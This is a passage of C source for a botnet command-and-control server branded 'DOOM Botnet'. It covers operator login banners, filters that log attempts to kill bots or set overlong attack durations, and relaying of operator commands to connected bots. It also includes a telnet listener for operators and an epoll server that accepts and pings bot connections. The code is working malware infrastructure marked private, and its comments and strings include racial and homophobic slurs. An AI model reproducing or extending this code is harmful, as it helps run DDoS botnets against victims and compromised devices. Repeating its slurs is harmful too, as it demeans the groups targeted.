		sprintf(ascii_banner_line15, "\x1b[1;36m         ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝\r\n");
		sprintf(ascii_banner_line16, "\x1b[0;36m\r\n");
      	sprintf(crystal1, "\x1b[37m           [+]-\x1b[35mWelcome %s To The Crystal Botnet\x1b[37m-[+]\r\n", accounts[find_line].id, buf);
		sprintf(crystal2, "\x1b[1;36m $ Type Help for your options $\r\n");
		
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line11, strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line12, strlen(ascii_banner_line12), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line13, strlen(ascii_banner_line13), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line14, strlen(ascii_banner_line14), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line15, strlen(ascii_banner_line15), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, ascii_banner_line16, strlen(ascii_banner_line16), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, crystal1, strlen(crystal1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, crystal2, strlen(crystal2), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		if(send(thefd, "\x1b[0;31m~> \x1b[0;31m", 13, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		continue;
     	}
		if(strstr(buf, "CLEAR_RASTA")){
		   
		char RASTA1 [80];
		char RASTA2 [80];
		char RASTA3 [80];
		char RASTA4 [80];
		char RASTA5 [80];
		char RASTA6 [80];
		char RASTA7 [80];
        char RASTA8 [80];
		char RASTA9 [80];
    
        sprintf(RASTA1, "\x1b[1;31m        d8888b.  .d88b.   .d88b.  .88b  d88.     \r\n");
		sprintf(RASTA2, "\x1b[1;31m        88  `8D .8P  Y8. .8P  Y8. 88'YbdP`88     \r\n");
		sprintf(RASTA3, "\x1b[1;33m        88   88 88    88 88    88 88  88  88     \r\n");
		sprintf(RASTA4, "\x1b[1;33m        88   88 88    88 88    88 88  88  88     \r\n");
		sprintf(RASTA5, "\x1b[1;32m        88  .8D `8b  d8' `8b  d8' 88  88  88     \r\n");
		sprintf(RASTA6, "\x1b[1;32m        Y8888D'  `Y88P'   `Y88P'  YP  YP  YP     \r\n");
		sprintf(RASTA7, "\x1b[1;32m\r\n");
        sprintf(RASTA8, "\x1b[1;37m          [+]-\x1b[1;31mWelcome %s \x1b[1;33mTo The\x1b[32m DOOM\x1b[1;37m-[+]\r\n", accounts[find_line].id, buf);
		sprintf(RASTA9, "\x1b[1;36m $ Type Help for your options $\r\n");
		
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, RASTA1, strlen(RASTA1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, RASTA2, strlen(RASTA2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, RASTA3, strlen(RASTA3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, RASTA4, strlen(RASTA4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, RASTA5, strlen(RASTA5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, RASTA6, strlen(RASTA6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, RASTA7, strlen(RASTA7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, RASTA8, strlen(RASTA8), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, RASTA9, strlen(RASTA9), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		if(send(thefd, "\x1b[0;31m~> \x1b[0;31m", 13, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		continue;
     	}
		if(strstr(buf, "CLEAR_LIT")){
		   
		char LIT1 [80];
		char LIT2 [80];
		char LIT3 [80];
		char LIT4 [80];
		char LIT5 [80];
		char LIT6 [80];
		char LIT7 [80];
        char LIT8 [80];
		char LIT9 [80];
    
       	sprintf(LIT1, "\x1b[0;36m       :::::::::   ::::::::   ::::::::  ::::    ::::      \r\n");
		sprintf(LIT2, "\x1b[0;36m       :+:    :+: :+:    :+: :+:    :+: +:+:+: :+:+:+     \r\n");
		sprintf(LIT3, "\x1b[0;36m       +:+    +:+ +:+    +:+ +:+    +:+ +:+ +:+:+ +:+     \r\n");
		sprintf(LIT4, "\x1b[0;36m       +#+    +:+ +#+    +:+ +#+    +:+ +#+  +:+  +#+     \r\n");
		sprintf(LIT5, "\x1b[0;36m       +#+    +#+ +#+    +#+ +#+    +#+ +#+       +#+     \r\n");
		sprintf(LIT6, "\x1b[0;36m       #+#    #+# #+#    #+# #+#    #+# #+#       #+#     \r\n");
		sprintf(LIT7, "\x1b[0;36m       #########   ########   ########  ###       ###     \r\n");
        sprintf(LIT8, "\x1b[31m          [+]-\x1b[0;32mWelcome %s To The DOOM\x1b[31m-[+]\r\n", accounts[find_line].id, buf);
		sprintf(LIT9, "\x1b[1;36m $ Type Help for your options $\r\n");
		
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, LIT1, strlen(LIT1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, LIT2, strlen(LIT2), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, LIT3, strlen(LIT3), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, LIT4, strlen(LIT4), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, LIT5, strlen(LIT5), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, LIT6, strlen(LIT6), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, LIT7, strlen(LIT7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, LIT8, strlen(LIT8), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, LIT9, strlen(LIT9), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		if(send(thefd, "\x1b[0;31m~> \x1b[0;31m", 13, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		continue;
		}
		if(strstr(buf, "CLEAR_SMALL")){
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        char small1[80];
	 
		sprintf(small1, "\x1b[0;37m*\x1b[0;31mWelcome To The DOOM Boatnet >.< S0Sexy!\x1b[0;37m*\r\n");
		
        if(send(thefd, "\x1b[0;37m*****************************************\r\n", 51, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, small1, strlen(small1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, "\x1b[0;37m*****************************************\r\n\r\n~>\x1b[0m", 50, MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		if(send(thefd, "\x1b[0;31m~> \x1b[0;31m", 13, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		continue;
     	}
		
        if(strstr(buf, "LOGOUT")) 
	    {  
 		  sprintf(botnet, "DAS SUM GGOOD MARIJUANA MAAN PEACE HOMIE I SEE YA DA NEXT TIME MANN %s Cya Next Time\r\n", accounts[find_line].id, buf);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  goto end;
		} // No fuckin time limit nigga we fuckin shit up !!!!!!  :)
		if(strstr(buf, "99999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
     	if(strstr(buf, "99999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "99999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "99999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
	    if(strstr(buf, "99999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
     	if(strstr(buf, "99999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "99999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "99999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
      	if(strstr(buf, "99999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "99999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
		if(strstr(buf, "99999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
    	if(strstr(buf, "99999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
	    if(strstr(buf, "99999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
	    if(strstr(buf, "99999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
	    if(strstr(buf, "99999999999")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
	    if(strstr(buf, "LOLNOGTFO")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
	    if(strstr(buf, "GTFOFAG")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }//if you dont like this just take out common sense 
    	if(strstr(buf, "DUP")) 
		{  
	    printf("ATTEMPT TO KILL YOUR BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("BOTKILLER.log", "a");
        fprintf(logFile, "ATTEMPT TO STEAL BOTS %s\n", accounts[find_line].id, buf);
        fclose(logFile);
	    goto end;
		}
		if(strstr(buf, "dup")) 
		{  
		printf("ATTEMPT TO KILL YOUR BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("SMALLBOTKILLER.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
				}
     			trim(buf);
                if(send(thefd, "\x1b[37m~> \x1b[0m", 11, MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].id, buf);
                FILE *logFile;
                logFile = fopen("report.log", "a");
                fprintf(logFile, "%s: \"%s\"\n",accounts[find_line].id, buf);
                fclose(logFile);
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
        }
 
        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
void *telnetListener(int port)
{
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
                fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
		printf("\x1b[32mTHIS SHIT PRIVATE,\x1b[33m DO NOT FUCKING LEAK, \x1b[34mDOOM \x1b[35mBOTNET \x1b[36mSCREENED\x1b[0m\n");
        telFD = fopen("bots.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 2], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
                broadcast("PING", -1, "PURGE");
                sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}